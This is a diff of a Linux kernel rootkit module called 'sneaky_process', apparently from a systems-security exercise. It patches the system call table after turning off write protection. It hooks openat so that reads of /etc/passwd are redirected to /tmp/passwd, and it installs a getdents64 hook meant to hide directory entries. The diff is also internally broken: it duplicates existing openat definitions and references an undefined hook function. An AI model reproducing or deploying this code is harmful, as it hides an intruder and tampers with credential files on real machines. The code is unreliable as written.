@@ -10,9 +10,17 @@
 #include <asm/cacheflush.h>
 
 #define PREFIX "sneaky_process"
-static int pid = 0;
-module_param(pid, int, 0);
-MODULE_PARM_DESC(pid, "sneaky_pid");
+static int sneaky_pid = 0;
+module_param(sneaky_pid, int, 0);
+MODULE_PARM_DESC(sneaky_pid, "sneaky_pid");
+struct linux_dirent
+{
+  u64 d_ino;
+  s64 d_off;
+  unsigned short d_reclen;
+  char d_name[];
+};
+
 // This is a pointer to the system call table
 static unsigned long *sys_call_table;
 // hello from new vm
@@ -54,6 +62,20 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   return (*original_openat)(regs);
 }
 
+asmlinkage int (*original_openat)(struct pt_regs *);
+
+// Define your new sneaky version of the 'openat' syscall
+asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
+{
+  unsigned long path_addr = regs->si;
+  char *pathname = (char *)path_addr;
+  if (strcmp(pathname, "/etc/passwd") == 0)
+  {
+    copy_to_user(pathname, "/tmp/passwd", strlen("/tmp/passwd") + 1);
+  }
+  return (*original_openat)(regs);
+}
+
 // The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
 {
@@ -68,14 +90,14 @@ static int initialize_sneaky_module(void)
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
   original_openat = (void *)sys_call_table[__NR_openat];
-
+  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
 
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
 
   // You need to replace other system calls you need to hack here
-
+  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
 
